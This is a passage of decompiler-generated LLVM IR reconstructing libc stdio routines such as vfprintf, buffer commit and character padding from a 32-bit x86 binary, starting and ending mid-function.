  %v0_8051a7a = load i32, i32* @esi, align 4
  %v0_8051a7b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a7b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8051a84 = call i32 @__errno_location(i32 %v0_8051a7b)
  store i32 %v1_8051a84, i32* @edi, align 4
  %v0_8051a8e = load i32, i32* @global_var_805d240.482, align 64
  store i32 %v0_8051a8e, i32* @esi, align 4
  %v1_8051a94 = inttoptr i32 %v1_8051a84 to i32*
  %v2_8051a94 = load i32, i32* %v1_8051a94, align 4
  store i32 %v2_8051a94, i32* %ebp.global-to-local, align 4
  %v1_8051a98 = call i32 @isatty(i32 0)
  %v0_8051a9d = load i32, i32* @ebx, align 4
  %v2_8051a9f = sub i32 %v0_8051a9d, %v1_8051a98
  %v2_8051aaa = mul i32 %v2_8051a9f, 256
  %v0_8051aad = load i32, i32* @esi, align 4
  %v2_8051aad = xor i32 %v0_8051aad, %v2_8051aaa
  %v1_8051aaf = trunc i32 %v2_8051aad to i16
  store i16 %v1_8051aaf, i16* bitcast (i32* @global_var_805d240.482 to i16*), align 64
  %v0_8051ab6 = load i32, i32* @global_var_805d290.483, align 16
  store i32 %v0_8051ab6, i32* @esi, align 4
  %v1_8051abc = call i32 @isatty(i32 1)
  %v0_8051ac1 = load i32, i32* @ebx, align 4
  %v2_8051ac1 = sub i32 %v0_8051ac1, %v1_8051abc
  %v2_8051ac3 = mul i32 %v2_8051ac1, 256
  %v0_8051ac6 = load i32, i32* @esi, align 4
  %v2_8051ac6 = xor i32 %v2_8051ac3, %v0_8051ac6
  %v1_8051ac8 = trunc i32 %v2_8051ac6 to i16
  store i16 %v1_8051ac8, i16* bitcast (i32* @global_var_805d290.483 to i16*), align 16
  %v0_8051acf = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051acf = load i32, i32* @edi, align 4
  %v2_8051acf = inttoptr i32 %v1_8051acf to i32*
  store i32 %v0_8051acf, i32* %v2_8051acf, align 4
  %v2_8051ad4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051ad4, i32* @ebx, align 4
  store i32 %v0_8051a7a, i32* @esi, align 4
  store i32 %v0_8051a79, i32* @edi, align 4
  ret i32 %v1_8051abc

; uselistorder directives
  uselistorder i32 %v1_8051a84, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051ae7 = inttoptr i32 %arg1 to i16*
  %v4_8051ae7 = call i32 @memcpy(i16* %v3_8051ae7, i32 ptrtoint (i32* @global_var_805b5a0.486 to i32), i32 24)
  ret i32 %v4_8051ae7
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051af0 = load i32, i32* @esi, align 4
  %v0_8051af1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051af1, i32* %stack_var_-8, align 4
  %v1_8051afa = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805d20c.487 to i32))
  store i32 %v1_8051afa, i32* %eax.global-to-local, align 4
  %v1_8051b06 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805d224.488 to i32))
  store i32 %v1_8051b06, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_8051b5022 = icmp eq i32 %storemerge21, 0
  %v1_8051b5223 = icmp eq i1 %v1_8051b5022, false
  br i1 %v1_8051b5223, label %dec_label_pc_8051b13.lr.ph, label %dec_label_pc_8051b70.preheader

dec_label_pc_8051b13.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051b13

dec_label_pc_8051b13:                             ; preds = %dec_label_pc_8051b13.lr.ph, %dec_label_pc_8051b3a
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_8051b13.lr.ph ], [ %storemerge, %dec_label_pc_8051b3a ]
  %v1_8051b16 = add i32 %storemerge24, 56
  store i32 %v1_8051b16, i32* @esi, align 4
  %v1_8051b1a = call i32 @__pthread_return_0(i32 %v1_8051b16)
  store i32 %v1_8051b1a, i32* %eax.global-to-local, align 4
  %v1_8051b22 = icmp eq i32 %v1_8051b1a, 0
  br i1 %v1_8051b22, label %dec_label_pc_8051b3a, label %dec_label_pc_8051b26

dec_label_pc_8051b26:                             ; preds = %dec_label_pc_8051b13
  %v0_8051b26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b26 = add i32 %v0_8051b26, 8
  %v2_8051b26 = inttoptr i32 %v1_8051b26 to i32*
  %v3_8051b26 = load i32, i32* %v2_8051b26, align 4
  store i32 %v3_8051b26, i32* %eax.global-to-local, align 4
  %v1_8051b29 = inttoptr i32 %v0_8051b26 to i16*
  store i16 48, i16* %v1_8051b29, align 2
  %v0_8051b2e = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b2e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b2e = add i32 %v1_8051b2e, 24
  %v3_8051b2e = inttoptr i32 %v2_8051b2e to i32*
  store i32 %v0_8051b2e, i32* %v3_8051b2e, align 4
  %v0_8051b31 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b31 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b31 = add i32 %v1_8051b31, 28
  %v3_8051b31 = inttoptr i32 %v2_8051b31 to i32*
  store i32 %v0_8051b31, i32* %v3_8051b31, align 4
  %v0_8051b34 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b34 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b34 = add i32 %v1_8051b34, 16
  %v3_8051b34 = inttoptr i32 %v2_8051b34 to i32*
  store i32 %v0_8051b34, i32* %v3_8051b34, align 4
  %v0_8051b37 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b37 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b37 = add i32 %v1_8051b37, 20
  %v3_8051b37 = inttoptr i32 %v2_8051b37 to i32*
  store i32 %v0_8051b37, i32* %v3_8051b37, align 4
  br label %dec_label_pc_8051b3a

dec_label_pc_8051b3a:                             ; preds = %dec_label_pc_8051b13, %dec_label_pc_8051b26
  %v0_8051b3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b3d = add i32 %v0_8051b3d, 52
  %v2_8051b3d = inttoptr i32 %v1_8051b3d to i32*
  store i32 1, i32* %v2_8051b3d, align 4
  %v0_8051b44 = load i32, i32* @esi, align 4
  %v1_8051b45 = call i32 @__stdio_init_mutex(i32 %v0_8051b44)
  store i32 %v1_8051b45, i32* %eax.global-to-local, align 4
  %v0_8051b4a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b4a = add i32 %v0_8051b4a, 32
  %v2_8051b4a = inttoptr i32 %v1_8051b4a to i32*
  %storemerge = load i32, i32* %v2_8051b4a, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8051b50 = icmp eq i32 %storemerge, 0
  %v1_8051b52 = icmp eq i1 %v1_8051b50, false
  br i1 %v1_8051b52, label %dec_label_pc_8051b13, label %dec_label_pc_8051b4d.dec_label_pc_8051b70.preheader_crit_edge

dec_label_pc_8051b4d.dec_label_pc_8051b70.preheader_crit_edge: ; preds = %dec_label_pc_8051b3a
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 4
  br label %dec_label_pc_8051b70.preheader

dec_label_pc_8051b70.preheader:                   ; preds = %dec_label_pc_8051b4d.dec_label_pc_8051b70.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8051b4d.dec_label_pc_8051b70.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_8051b703 = icmp eq i32 %storemerge12, 0
  %v1_8051b7210 = icmp eq i1 %v1_8051b703, false
  br i1 %v1_8051b7210, label %dec_label_pc_8051b5c.preheader, label %dec_label_pc_8051b74

dec_label_pc_8051b5c.preheader:                   ; preds = %dec_label_pc_8051b70.preheader
  br label %dec_label_pc_8051b5c

dec_label_pc_8051b5c:                             ; preds = %dec_label_pc_8051b5c.preheader, %dec_label_pc_8051b6d
  %v0_8051b64 = phi i32 [ %storemerge1, %dec_label_pc_8051b6d ], [ %storemerge12, %dec_label_pc_8051b5c.preheader ]
  %v1_8051b5c = inttoptr i32 %v0_8051b64 to i8*
  %v2_8051b5c = load i8, i8* %v1_8051b5c, align 1
  %v3_8051b5c = and i8 %v2_8051b5c, 64
  %v4_8051b5c = icmp eq i8 %v3_8051b5c, 0
  br i1 %v4_8051b5c, label %dec_label_pc_8051b6d, label %dec_label_pc_8051b61

dec_label_pc_8051b61:                             ; preds = %dec_label_pc_8051b5c
  %v1_8051b65 = call i32 @__stdio_wcommit(i32 %v0_8051b64)
  store i32 %v1_8051b65, i32* %eax.global-to-local, align 4
  %v0_8051b6d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b6d

dec_label_pc_8051b6d:                             ; preds = %dec_label_pc_8051b5c, %dec_label_pc_8051b61
  %v0_8051b6d = phi i32 [ %v0_8051b64, %dec_label_pc_8051b5c ], [ %v0_8051b6d.pre, %dec_label_pc_8051b61 ]
  %v1_8051b6d = add i32 %v0_8051b6d, 32
  %v2_8051b6d = inttoptr i32 %v1_8051b6d to i32*
  %storemerge1 = load i32, i32* %v2_8051b6d, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8051b70 = icmp eq i32 %storemerge1, 0
  %v1_8051b72 = icmp eq i1 %v1_8051b70, false
  br i1 %v1_8051b72, label %dec_label_pc_8051b5c, label %dec_label_pc_8051b74

dec_label_pc_8051b74:                             ; preds = %dec_label_pc_8051b6d, %dec_label_pc_8051b70.preheader
  %v2_8051b74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b74, i32* %eax.global-to-local, align 4
  %v2_8051b75 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b75, i32* @ebx, align 4
  store i32 %v0_8051af0, i32* @esi, align 4
  ret i32 %v2_8051b74

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051b6d, { 1, 0 }
  uselistorder label %dec_label_pc_8051b5c, { 1, 0 }
  uselistorder label %dec_label_pc_8051b3a, { 1, 0 }
  uselistorder label %dec_label_pc_8051b13, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8051b78 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051b80 = add i32 %arg1, 8
  %v2_8051b80 = inttoptr i32 %v1_8051b80 to i32*
  %v3_8051b80 = load i32, i32* %v2_8051b80, align 4
  store i32 %v3_8051b80, i32* %edx.global-to-local, align 4
  %v1_8051b83 = add i32 %arg1, 16
  %v2_8051b83 = inttoptr i32 %v1_8051b83 to i32*
  %v3_8051b83 = load i32, i32* %v2_8051b83, align 4
  %v2_8051b86 = sub i32 %v3_8051b83, %v3_8051b80
  %v12_8051b86 = icmp eq i32 %v2_8051b86, 0
  store i32 %v2_8051b86, i32* %eax.global-to-local, align 4
  br i1 %v12_8051b86, label %dec_label_pc_8051b99, label %dec_label_pc_8051b8a

dec_label_pc_8051b8a:                             ; preds = %entry
  store i32 %v3_8051b80, i32* %v2_8051b83, align 4
  %v0_8051b8d = load i32, i32* @ecx, align 4
  %v0_8051b8e = load i32, i32* %eax.global-to-local, align 4
  %v0_8051b8f = load i32, i32* %edx.global-to-local, align 4
  %v0_8051b90 = load i32, i32* @ebx, align 4
  %v4_8051b91 = inttoptr i32 %v0_8051b90 to i16*
  %v5_8051b91 = call i32 @__stdio_WRITE(i16* %v4_8051b91, i32 %v0_8051b8f, i32 %v0_8051b8e, i32 %v0_8051b8d)
  store i32 %v5_8051b91, i32* %eax.global-to-local, align 4
  %v0_8051b99.pre = load i32, i32* @ebx, align 4
  %v2_8051b9f.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051b99

dec_label_pc_8051b99:                             ; preds = %entry, %dec_label_pc_8051b8a
  %v2_8051b9f = phi i32 [ %tmp11, %entry ], [ %v2_8051b9f.pre, %dec_label_pc_8051b8a ]
  %v0_8051b99 = phi i32 [ %arg1, %entry ], [ %v0_8051b99.pre, %dec_label_pc_8051b8a ]
  %v1_8051b99 = add i32 %v0_8051b99, 16
  %v2_8051b99 = inttoptr i32 %v1_8051b99 to i32*
  %v3_8051b99 = load i32, i32* %v2_8051b99, align 4
  store i32 %v3_8051b99, i32* %eax.global-to-local, align 4
  %v2_8051b9c = add i32 %v0_8051b99, 8
  %v3_8051b9c = inttoptr i32 %v2_8051b9c to i32*
  %v4_8051b9c = load i32, i32* %v3_8051b9c, align 4
  %v5_8051b9c = sub i32 %v3_8051b99, %v4_8051b9c
  store i32 %v5_8051b9c, i32* %eax.global-to-local, align 4
  store i32 %v2_8051b9f, i32* @edx, align 4
  store i32 %v0_8051b78, i32* @ebx, align 4
  ret i32 %v5_8051b9c

; uselistorder directives
  uselistorder i32 %v0_8051b99, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051b99, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_8051ba7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8051baa = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051baa, i32* @esi, align 4
  %v1_8051bae = add i32 %v4_8051baa, 52
  %v2_8051bae = inttoptr i32 %v1_8051bae to i32*
  %v3_8051bae = load i32, i32* %v2_8051bae, align 4
  store i32 %v3_8051bae, i32* @edi, align 4
  %v1_8051bb1 = icmp eq i32 %v3_8051bae, 0
  %v1_8051bb3 = icmp eq i1 %v1_8051bb1, false
  br i1 %v1_8051bb3, label %dec_label_pc_8051bd4, label %dec_label_pc_8051bb5

dec_label_pc_8051bb5:                             ; preds = %entry
  %v1_8051bb5 = add i32 %v4_8051baa, 56
  store i32 %v1_8051bb5, i32* @ebx, align 4
  store i32 %v12_8051ba7, i32* @eax, align 4
  %v3_8051bc4 = call i32 @__pthread_return_void(i32 %v12_8051ba7, i32 134564459)
  %v0_8051bc9 = load i32, i32* @ebx, align 4
  %v2_8051bcc = call i32 @__pthread_return_0(i32 %v0_8051bc9)
  %v0_8051bd4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051bd4

dec_label_pc_8051bd4:                             ; preds = %entry, %dec_label_pc_8051bb5
  %v0_8051bea = phi i32 [ %v4_8051baa, %entry ], [ %v0_8051bd4.pre, %dec_label_pc_8051bb5 ]
  %v1_8051bd4 = inttoptr i32 %v0_8051bea to i16*
  %v2_8051bd4 = load i16, i16* %v1_8051bd4, align 2
  %v1_8051bd7 = and i16 %v2_8051bd4, 192
  %v6_8051bdc = icmp eq i16 %v1_8051bd7, 192
  br i1 %v6_8051bdc, label %dec_label_pc_8051bd4.dec_label_pc_8051bfa_crit_edge, label %dec_label_pc_8051be3

dec_label_pc_8051bd4.dec_label_pc_8051bfa_crit_edge: ; preds = %dec_label_pc_8051bd4
  br label %dec_label_pc_8051bfa

dec_label_pc_8051be3:                             ; preds = %dec_label_pc_8051bd4
  %v0_8051be3 = load i32, i32* @ecx, align 4
  %v6_8051beb = call i32 @__stdio_trans2w_o(i16* %v1_8051bd4, i32 128, i32 %v0_8051be3, i32 %v0_8051be3)
  store i32 -1, i32* @ebx, align 4
  %v1_8051bf6 = icmp eq i32 %v6_8051beb, 0
  %v1_8051bf8 = icmp eq i1 %v1_8051bf6, false
  br i1 %v1_8051bf8, label %dec_label_pc_8051c0e, label %dec_label_pc_8051be3.dec_label_pc_8051bfa_crit_edge

dec_label_pc_8051be3.dec_label_pc_8051bfa_crit_edge: ; preds = %dec_label_pc_8051be3
  %v0_8051c03.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051bfa

dec_label_pc_8051bfa:                             ; preds = %dec_label_pc_8051bd4.dec_label_pc_8051bfa_crit_edge, %dec_label_pc_8051be3.dec_label_pc_8051bfa_crit_edge
  %v0_8051c03 = phi i32 [ %v0_8051bea, %dec_label_pc_8051bd4.dec_label_pc_8051bfa_crit_edge ], [ %v0_8051c03.pre, %dec_label_pc_8051be3.dec_label_pc_8051bfa_crit_edge ]
  %v0_8051bfa = load i32, i32* @edx, align 4
  %v5_8051c04 = inttoptr i32 %arg2 to i8*
  %v6_8051c04 = call i32 @_vfprintf_internal(i32 %v0_8051c03, i8* %v5_8051c04, i32 %arg3, i32 %v0_8051bfa)
  store i32 %v6_8051c04, i32* @ebx, align 4
  br label %dec_label_pc_8051c0e

dec_label_pc_8051c0e:                             ; preds = %dec_label_pc_8051be3, %dec_label_pc_8051bfa
  %v0_8051c267 = phi i32 [ -1, %dec_label_pc_8051be3 ], [ %v6_8051c04, %dec_label_pc_8051bfa ]
  br i1 %v1_8051bb3, label %dec_label_pc_8051c23, label %dec_label_pc_8051c12

dec_label_pc_8051c12:                             ; preds = %dec_label_pc_8051c0e
  store i32 %v12_8051ba7, i32* @eax, align 4
  %v3_8051c1b = call i32 @__pthread_return_void(i32 %v12_8051ba7, i32 1)
  %v0_8051c26.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051c23

dec_label_pc_8051c23:                             ; preds = %dec_label_pc_8051c0e, %dec_label_pc_8051c12
  %v0_8051c26 = phi i32 [ %v0_8051c267, %dec_label_pc_8051c0e ], [ %v0_8051c26.pre, %dec_label_pc_8051c12 ]
  ret i32 %v0_8051c26

; uselistorder directives
  uselistorder i32 %v12_8051ba7, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_8051c23, { 1, 0 }
  uselistorder label %dec_label_pc_8051c0e, { 1, 0 }
  uselistorder label %dec_label_pc_8051bfa, { 1, 0 }
  uselistorder label %dec_label_pc_8051bd4, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8051c2c = load i32, i32* @edi, align 4
  %v0_8051c2d = load i32, i32* @esi, align 4
  %v0_8051c2e = load i32, i32* @ebx, align 4
  %v0_8051c2f = load i32, i32* @eax, align 4
  store i32 %v0_8051c2f, i32* @edi, align 4
  %v0_8051c34 = load i32, i32* @ecx, align 4
  store i32 %v0_8051c34, i32* @esi, align 4
  store i32 %v0_8051c34, i32* @ebx, align 4
  %v0_8051c38 = load i32, i32* @edx, align 4
  store i32 %v0_8051c38, i32* %stack_var_-13, align 4
  %v1_8051c3f2 = icmp eq i32 %v0_8051c34, 0
  br i1 %v1_8051c3f2, label %dec_label_pc_8051c57, label %dec_label_pc_8051c43.lr.ph

dec_label_pc_8051c43.lr.ph:                       ; preds = %entry
  %v2_8051c43 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8051c43

dec_label_pc_8051c3e:                             ; preds = %dec_label_pc_8051c43
  %v1_8051c3e = add i32 %v0_8051c3e, -1
  %v8_8051c3e = icmp eq i32 %v1_8051c3e, 0
  store i32 %v1_8051c3e, i32* @ebx, align 4
  br i1 %v8_8051c3e, label %dec_label_pc_8051c57.loopexit, label %dec_label_pc_8051c3e.dec_label_pc_8051c43_crit_edge

dec_label_pc_8051c3e.dec_label_pc_8051c43_crit_edge: ; preds = %dec_label_pc_8051c3e
  %v0_8051c47.pre = load i32, i32* @edx, align 4
  %v0_8051c48.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c43

dec_label_pc_8051c43:                             ; preds = %dec_label_pc_8051c3e.dec_label_pc_8051c43_crit_edge, %dec_label_pc_8051c43.lr.ph
  %v0_8051c48 = phi i32 [ %v0_8051c48.pre, %dec_label_pc_8051c3e.dec_label_pc_8051c43_crit_edge ], [ %v0_8051c2f, %dec_label_pc_8051c43.lr.ph ]
  %v0_8051c47 = phi i32 [ %v0_8051c47.pre, %dec_label_pc_8051c3e.dec_label_pc_8051c43_crit_edge ], [ %v0_8051c38, %dec_label_pc_8051c43.lr.ph ]
  %v4_8051c4c = call i32 @__stdio_fwrite(i32 %v2_8051c43, i32 1, i32 %v0_8051c48, i32 %v0_8051c47)
  %v8_8051c54 = icmp eq i32 %v4_8051c4c, 1
  %v0_8051c3e = load i32, i32* @ebx, align 4
  br i1 %v8_8051c54, label %dec_label_pc_8051c3e, label %dec_label_pc_8051c57.loopexit

dec_label_pc_8051c57.loopexit:                    ; preds = %dec_label_pc_8051c3e, %dec_label_pc_8051c43
  %v1_8051c57.ph = phi i32 [ %v0_8051c3e, %dec_label_pc_8051c43 ], [ 0, %dec_label_pc_8051c3e ]
  %v0_8051c57.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c57

dec_label_pc_8051c57:                             ; preds = %dec_label_pc_8051c57.loopexit, %entry
  %v0_8051c57 = phi i32 [ 0, %entry ], [ %v0_8051c57.pre, %dec_label_pc_8051c57.loopexit ]
  %v1_8051c57 = phi i32 [ 0, %entry ], [ %v1_8051c57.ph, %dec_label_pc_8051c57.loopexit ]
  %v2_8051c57 = sub i32 %v0_8051c57, %v1_8051c57
  store i32 %v0_8051c2e, i32* @ebx, align 4
  store i32 %v0_8051c2d, i32* @esi, align 4
  store i32 %v0_8051c2c, i32* @edi, align 4
  ret i32 %v2_8051c57

; uselistorder directives
  uselistorder i32 %v1_8051c3e, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8051c57.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8051c75 = trunc i32 %arg2 to i8
  %v5_8051c75 = icmp slt i8 %v3_8051c75, 0
  %v1_8051c77 = icmp eq i1 %v5_8051c75, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_8051c77, label %dec_label_pc_8051ca8, label %dec_label_pc_8051c79

dec_label_pc_8051c79:                             ; preds = %entry
  %v3_8051c80 = call i32 @strlen(i8* %arg4)
  %v0_8051c88 = load i32, i32* @ebx, align 4
  %v2_8051c88 = sub i32 %v0_8051c88, %v3_8051c80
  store i32 %v2_8051c88, i32* @ebx, align 4
  store i32 %v3_8051c80, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8051c88, 1
  br i1 %tmp23, label %dec_label_pc_8051ca6, label %dec_label_pc_8051c90

dec_label_pc_8051c90:                             ; preds = %dec_label_pc_8051c79
  %v0_8051c90 = load i32, i32* @edi, align 4
  %v1_8051c90 = urem i32 %v0_8051c90, 128
  store i32 %v1_8051c90, i32* @edi, align 4
  store i32 %v2_8051c88, i32* @ecx, align 4
  store i32 %v1_8051c90, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8051c9b = call i32 @_charpad()
  store i32 %v0_8051c9b, i32* @ebp, align 4
  %v12_8051ca2 = icmp eq i32 %v0_8051c9b, %v2_8051c88
  %v1_8051ca4 = icmp eq i1 %v12_8051ca2, false
  br i1 %v1_8051ca4, label %dec_label_pc_8051cc2, label %dec_label_pc_8051c90.dec_label_pc_8051ca6_crit_edge

dec_label_pc_8051c90.dec_label_pc_8051ca6_crit_edge: ; preds = %dec_label_pc_8051c90
  %v0_8051ca6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051ca6

dec_label_pc_8051ca6:                             ; preds = %dec_label_pc_8051c90.dec_label_pc_8051ca6_crit_edge, %dec_label_pc_8051c79
  %v0_8051ca6 = phi i32 [ %v0_8051ca6.pre, %dec_label_pc_8051c90.dec_label_pc_8051ca6_crit_edge ], [ %v3_8051c80, %dec_label_pc_8051c79 ]
  store i32 %v0_8051ca6, i32* @ebx, align 4
  br label %dec_label_pc_8051ca8

dec_label_pc_8051ca8:                             ; preds = %entry, %dec_label_pc_8051ca6
  %v0_8051cb3 = phi i32 [ %arg3, %entry ], [ %v0_8051ca6, %dec_label_pc_8051ca6 ]
  %tmp24 = icmp slt i32 %v0_8051cb3, 1
  br i1 %tmp24, label %dec_label_pc_8051cc0, label %dec_label_pc_8051cae

dec_label_pc_8051cae:                             ; preds = %dec_label_pc_8051ca8
  %v0_8051cae = load i32, i32* @ecx, align 4
  %v5_8051cb8 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8051cb3, i32 %arg1, i32 %v0_8051cae)
  br label %dec_label_pc_8051cc0

dec_label_pc_8051cc0:                             ; preds = %dec_label_pc_8051ca8, %dec_label_pc_8051cae
  %v1_8051cc0 = phi i32 [ 0, %dec_label_pc_8051ca8 ], [ %v5_8051cb8, %dec_label_pc_8051cae ]
  %v0_8051cc0 = load i32, i32* @ebp, align 4
  %v2_8051cc0 = add i32 %v0_8051cc0, %v1_8051cc0
  br label %dec_label_pc_8051cc2

dec_label_pc_8051cc2:                             ; preds = %dec_label_pc_8051c90, %dec_label_pc_8051cc0
  %v0_8051cc5 = phi i32 [ %v0_8051c9b, %dec_label_pc_8051c90 ], [ %v2_8051cc0, %dec_label_pc_8051cc0 ]
  ret i32 %v0_8051cc5

; uselistorder directives
  uselistorder i32 %v0_8051cb3, { 1, 0 }
  uselistorder i32 %v0_8051c9b, { 1, 0, 2 }
  uselistorder i32 %v1_8051c90, { 1, 0 }
  uselistorder i32 %v2_8051c88, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc2, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc0, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca8, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_8051cd6 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8051cd6, i32* @ebx, align 4
  %v2_8051cde = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8051cde, i32* @esi, align 4
  %v5_8051ce3 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8051cd6)
  store i32 %v5_8051ce3, i32* %eax.global-to-local, align 4
  %v2_8051ceb = icmp slt i32 %v5_8051ce3, 0
  %v1_8051ced = icmp eq i1 %v2_8051ceb, false
  br i1 %v1_8051ced, label %dec_label_pc_8051d2d, label %dec_label_pc_8051cef

dec_label_pc_8051cef:                             ; preds = %entry
  %v3_8051cef = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8051cef, i32* @ebx, align 4
  %v5_8051cf6 = inttoptr i32 %v3_8051cef to i8*
  %v3_8051cf7 = call i32 @strlen(i8* %v5_8051cf6)
  store i32 %v3_8051cf7, i32* %eax.global-to-local, align 4
  %v1_8051cff = icmp eq i32 %v3_8051cf7, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_8051cff, label %dec_label_pc_8052266, label %dec_label_pc_8051d0e

dec_label_pc_8051d0e:                             ; preds = %dec_label_pc_8051cef
  %v0_8051d0e = load i32, i32* @edx, align 4
  %v0_8051d17 = load i32, i32* @ebx, align 4
  %v6_8051d18 = call i32 @__stdio_fwrite(i32 %v0_8051d17, i32 %v3_8051cf7, i32 %arg1, i32 %v0_8051d0e)
  store i32 %v6_8051d18, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_8052266

dec_label_pc_8051d2d:                             ; preds = %entry
  %v6_8051d37 = call i32 @_ppfs_prepargs(i32 %v2_8051cde, i32 %arg3, i32 %v5_8051ce3, i32 %v5_8051ce3)
  store i32 %v6_8051d37, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8051d44 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d44, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d4c

dec_label_pc_8051d4b:                             ; preds = %dec_label_pc_8051d52
  %v1_8051d4b = add i32 %v0_8051d5a, 1
  store i32 %v1_8051d4b, i32* @ebx, align 4
  br label %dec_label_pc_8051d4c.backedge

dec_label_pc_8051d4c.backedge:                    ; preds = %dec_label_pc_8051d4b, %dec_label_pc_805224c, %dec_label_pc_8052257
  %v1_8051d5620 = phi i32 [ %v1_8051d5e, %dec_label_pc_8051d4b ], [ %v3_805224c, %dec_label_pc_805224c ], [ %v1_8051d8a, %dec_label_pc_8052257 ]
  %v0_8051d4c18 = phi i32 [ %v1_8051d4b, %dec_label_pc_8051d4b ], [ %v3_805224c, %dec_label_pc_805224c ], [ %v1_8052257, %dec_label_pc_8052257 ]
  %v4_8051d4c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d4c

dec_label_pc_8051d4c:                             ; preds = %dec_label_pc_8051d4c.backedge, %dec_label_pc_8051d2d
